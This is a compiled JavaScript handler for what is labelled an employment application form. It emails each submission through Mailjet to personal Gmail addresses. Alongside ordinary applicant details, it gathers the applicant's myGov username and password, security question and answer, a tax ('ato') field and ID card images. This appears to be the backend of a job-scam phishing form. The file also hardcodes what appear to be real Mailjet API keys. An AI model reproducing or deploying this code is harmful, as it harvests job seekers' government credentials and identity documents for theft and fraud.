"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const moment_1 = __importDefault(require("moment"));
function MailJetInit({ form_data }) {
    const Mailjet = require('node-mailjet');
    const mailjet = Mailjet.apiConnect("e9eaffa461afb81ea8a27096359b6174", "659637bc07b24b92ddc0f54e7f3d11f2");
    const request = mailjet
        .post("send", { 'version': 'v3.1' })
        .request({
        "Messages": [
            {
                "From": {
                    "Email": "musa4jubril@gmail.com",
                    "Name": "Employment Application Form"
                },
                "To": [
                    {
                        "Email": "jewbreel1@gmail.com",
                        "Name": "Musa"
                    },
                    {
                        "Email": "musa4jubril@gmail.com",
                        "Name": "Musa"
                    },
                ],
                "TemplateID": 4538541,
                "TemplateLanguage": true,
                "Subject": `[[data:full_name:${form_data.first_name + " " + form_data.last_name}]] Employment Application Form`,
                "Variables": {
                    "full_name": form_data.first_name + " " + form_data.last_name,
                    "created": (0, moment_1.default)(new Date()).format("LL"),
                    "phone_number": form_data.mobile_number,
                    "email": form_data.email,
                    "gender": form_data.gender,
                    "relationship": form_data.relationship,
                    "has_gov_profile": form_data.has_gov_profile,
                    "is_visa_holder": form_data.is_visa_holder,
                    "my_gov_username": form_data.my_gov_username,
                    "my_gov_password": form_data.my_gov_password,
                    "security_question": form_data.security_question,
                    "security_answer": form_data.security_answer,
                    "ato": form_data.ato,
                    "position": form_data.position,
                    "qualification": form_data.qualification,
                    "prev_work": form_data.prev_work,
                    "skills": form_data.skills,
                    "id_card": `front: ${form_data.id_card_front}\n back: ${form_data.id_card_front}`
                }
            }
        ]
    });
    request
        .then(() => {
        console.log("Done");
        return true;
    })
        .catch(() => {
        console.log("failed");
        return false;
    });
}
exports.default = MailJetInit;
// /**
//  *
//  * This call sends a message to the given recipient with vars and custom vars.
//  *
//  */
// const mailjet = require ('node-mailjet')
// 	.connect(process.env.MJ_APIKEY_PUBLIC, process.env.MJ_APIKEY_PRIVATE)
// const request = mailjet
// 	.post("send", {'version': 'v3.1'})
// 	.request({
// 		"Messages":[
// 			{
// 				"From": {
// 					"Email": "musa4jubril@gmail.com",
// 					"Name": "Employment Application Form"
// 				},
// 				"To": [
// 					{
// 						"Email": "passenger1@example.com",
// 						"Name": "passenger 1"
// 					}
// 				],
// 				"TemplateID": 4538541,
// 				"TemplateLanguage": true,
// 				"Subject": "[[data:full_name:form_data.]] Employment Application Form",
// 				"Variables": {
//       "full_name": "",
//       "created": "",
//       "phone_number": "",
//       "email": "",
//       "gender": "",
//       "relationship": "",
//       "has_gov_profile": "",
//       "is_visa_holder": "",
//       "my_gov_username": "",
//       "my_gov_password": "",
//       "security_question": "",
//       "security_answer": "",
//       "ato": "",
//       "position": "",
//       "qualification": "",
//       "prev_work": "",
//       "skills": "",
//       "id_card": ""
//     }
// 			}
// 		]
// 	})
// request
// 	.then((result) => {
// 		console.log(result.body)
// 	})
// 	.catch((err) => {
// 		console.log(err.statusCode)
// 	})
